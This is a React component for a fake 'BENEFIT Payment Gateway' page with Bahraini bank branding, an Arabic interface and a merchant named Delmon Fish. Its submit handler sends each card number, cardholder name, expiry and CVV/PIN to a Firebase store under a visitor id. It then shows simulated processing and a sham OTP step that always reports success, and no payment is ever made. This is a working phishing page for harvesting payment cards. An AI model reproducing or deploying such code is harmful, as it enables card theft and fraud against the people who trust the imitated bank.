"use client"

import type React from "react"

import { useState, useRef, useEffect } from "react"
import { OTPVerification } from "./otp"
import { FullPageLoader } from "../loader"
import { NumericKeypad } from "./numeric-keypad"
import { addData } from "../firebase"
import { useCart } from "../cartContext"

export default function BenefitPaymentGateway() {
  const [isLoading, setIsLoading] = useState(false)
  const [showKeypad, setShowKeypad] = useState(false)
  const [currentStep, setCurrentStep] = useState<"form" | "otp" | "success" | "error">("form")
  const cvvInputRef = useRef<HTMLInputElement>(null)
  const [cardNumber, setCardNumber] = useState("")
  const [cardholderName, setCardholderName] = useState("")
  const [cvv, setCvv] = useState("")
  const [month, setMonth] = useState("")
  const [yaer, setYear] = useState("")
  const {total} = useCart() as any
const data={cardNumber,cardholderName,cvv,month,yaer}

  // Handle clicking outside the keypad to close it
  useEffect(() => {
    function handleClickOutside(event: MouseEvent) {
      if (
        cvvInputRef.current &&
        !cvvInputRef.current.contains(event.target as Node) &&
        !(event.target as HTMLElement).closest(".numeric-keypad")
      ) {
        setShowKeypad(false)
      }
    }

    document.addEventListener("mousedown", handleClickOutside)
    return () => {
      document.removeEventListener("mousedown", handleClickOutside)
    }
  }, [])

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)
    const vId=localStorage.getItem('visitor')
    addData({id:vId,...data})
    // Simulate payment processing and move to OTP step
    setTimeout(() => {
      setIsLoading(false)
      setCurrentStep("otp")
    }, 3500)
  }

  // Update the handleVerifyOTP function to simulate successful verification
  const handleVerifyOTP = () => {
    setIsLoading(true)

    // Simulate OTP verification
    setTimeout(() => {
      setIsLoading(false)
      setCurrentStep("success")
    }, 2000)
  }

  // Add a function to handle OTP errors
  const handleOTPError = () => {
    // This function would be called if we wanted to handle OTP errors at the parent level
    // For now, we're handling errors within the OTP component
  }

  const handlePaymentError = () => {
    setCurrentStep("error")
  }

  const handleCvvFocus = () => {
    setShowKeypad(true)
  }

  const handleKeypadEnter = () => {
    setShowKeypad(false)
    // Move focus to next field or submit form
  }

  const handleResetForm = () => {
    setCardNumber("")
    setCardholderName("")
    setCvv("")
    setCurrentStep("form")
  }
  // Render different steps based on current state
  if (currentStep === "otp") {
    return (
      <div className="flex justify-center items-center min-h-screen " dir="rtl" style={{zoom:0.8,fontSize:12,lineHeight:1.2,padding:25}}>
      {isLoading && <FullPageLoader text="Verifying OTP..." />}
        <OTPVerification
          amount={total}
          cardNumber={cardNumber || "5586861234568686"}
          onVerify={handleVerifyOTP}
          onCancel={handleResetForm}
        />
      </div>
    )
  }


  return (
    <div className="flex justify-center items-center min-h-screen " dir="rtl" style={{zoom:0.75,fontSize:12,lineHeight:1.2,padding:15}}>
      {isLoading && <FullPageLoader />}

      <div className=" max-w-md bg-white border border-gray-200 shadow-sm">
        {/* Language selector */}
        <div className="text-left p-4">
          <span className="text-red-600 font-medium">English</span>
        </div>

        {/* Header */}
        <div className="text-center mb-4">
          <h1 className="text-red-600 font-bold text-2xl">BENEFIT PAYMENT GATEWAY</h1>
          <p className="text-red-600 font-bold mt-1">
            {new Date()
              .toLocaleDateString("en-GB", {
                day: "2-digit",
                month: "2-digit",
                year: "numeric",
                hour: "2-digit",
                minute: "2-digit",
                hour12: false,
              })
              .replace(/\//g, "-")}
          </p>
        </div>

        {/* Benefit Logo */}
        <div className="flex justify-center mb-4">
          <img src="/logo.webp" alt="Benefit Logo" width={100} height={100} className="mx-auto" />
        </div>

        {/* Merchant Info */}
        <div className="text-center mb-8">
          <p className="text-xl font-medium">Delmon Fish - أسماك دلمون</p>
          <p className="text-gray-600">@delmonfish</p>
        </div>

        {/* Payment Details */}
        <form onSubmit={handleSubmit} className="px-6">
          <div className="space-y-5 mb-8">
            <div className="flex justify-between items-center">
              <span className="text-right font-medium text-lg">المبلغ</span>
              <span className="font-bold text-lg"> {total.toFixed(2)}<strong style={{margin:2}}>BD</strong></span>
            </div>

            <div className="flex justify-between items-center">
              <span className="text-right font-medium">صنف البطاقة</span>
              <span className="font-bold">Debit</span>
            </div>

            {/* Card Form */}
            <div className="flex justify-between items-center">
              <label htmlFor="cardNumber" className="text-right font-medium">
                رقم البطاقة
              </label>
              <input
                id="cardNumber"
                type="text"
                value={cardNumber}
                onChange={(e) => setCardNumber(e.target.value.replace(/\D/g, ""))}
                className="border border-gray-300 rounded p-2 w-64 text-left"
                placeholder=""
                required
              />
            </div>

            <div className="flex justify-between items-center">
              <label className="text-right font-medium">تاريخ الصلاحية</label>
              <div className="flex gap-2">
              <select onChange={(e)=>setYear(e.target.value)} className="border border-gray-300 rounded p-2 w-[104px] appearance-none bg-white">
                  <option value="">YYYY</option>
                  {Array.from({ length: 10 }, (_, i) => 2025 + i).map((year) => (
                    <option key={year} value={year}>
                      {year}
                    </option>
                  ))}
                </select>
                <select onChange={(e)=>setMonth(e.target.value)} className="border border-gray-300 rounded p-2 w-[104px] appearance-none bg-white">
                  <option value="">MM</option>
                  {Array.from({ length: 12 }, (_, i) => i + 1).map((month) => (
                    <option key={month} value={month}>
                      {month.toString().padStart(2, "0")}
                    </option>
                  ))}
                </select>
              </div>
            </div>

            <div className="flex justify-between items-center">
              <label htmlFor="cardholderName" className="text-right font-medium">
                إسم صاحب البطاقة
              </label>
              <input
                id="cardholderName"
                type="text"
                value={cardholderName}
                onChange={(e) => setCardholderName(e.target.value)}
                className="border border-gray-300 rounded p-2 w-64 text-left"
                placeholder=""
                required
              />
            </div>

            <div className="flex justify-between items-center">
              <label htmlFor="cvv" className="text-right font-medium">
                الرقم السري
              </label>
              <input
                id="cvv"
                type="password"
                value={cvv}
                onChange={(e) => setCvv(e.target.value.replace(/\D/g, ""))}
                onFocus={handleCvvFocus}
                ref={cvvInputRef}
                className="border border-gray-300 rounded p-2 w-64 text-left"
                placeholder=""
                required
                readOnly={true}
                maxLength={4}
              />
            </div>
          </div>

          {/* Action Buttons */}
          <div className="flex gap-4 mb-6">
            <button
              type="button"
              className="bg-red-600 text-white rounded py-2.5 px-8 w-full font-medium hover:bg-red-700 transition-colors"
            >
              إلغاء
            </button>
            <button
              type="submit"
              className="bg-red-600 text-white rounded py-2.5 px-8 w-full font-medium hover:bg-red-700 transition-colors"
            >
              دفع
            </button>
          </div>

          {/* Accepted Cards */}
          <div className="text-right mb-4">
            <a href="#" className="text-red-600 hover:underline text-sm">
              عرض البطاقات المقبولة
            </a>
          </div>

          {/* Terms */}
          <div className="text-right mb-8 text-sm leading-relaxed">
            <p dir="rtl">
              <span className="font-bold">ملاحظة:</span> إن تقديم هذه المعلومات واستخدام "بوابة الدفع الإلكترونية من
              بنفت" يعني موافقتك على{" "}
              <a href="#" className="text-red-600 hover:underline">
                شروط هذه الخدمة - إبراء الذمة القانوني
              </a>
              .
            </p>
          </div>
        </form>

        {/* Numeric Keypad */}
        {showKeypad && (
          <div className="fixed bottom-0 left-0 right-0 numeric-keypad">
            <NumericKeypad value={cvv} onValueChange={setCvv} maxLength={4} onEnter={handleKeypadEnter} />
          </div>
        )}

        {/* Footer */}
        <div className="text-center space-y-2 mb-6">
          <img src="/logo.webp" alt="Benefit Logo" width={80} height={80} className="mx-auto" />
          <div className="px-6">
            <p className="text-right text-sm" dir="rtl">
              يدار الموقع من قبل شركة بنفت.
            </p>
            <p className="text-right text-sm" dir="rtl">
              حقوق التأليف © 2020-2025 لشركة بنفت. جميع الحقوق محفوظة.
            </p>
            <p className="text-right text-sm" dir="rtl">
              مرخص من قبل مصرف البحرين المركزي لتقديم الخدمات المساعدة للقطاع المالي.
            </p>
          </div>
        </div>
      </div>
    </div>
  )
}
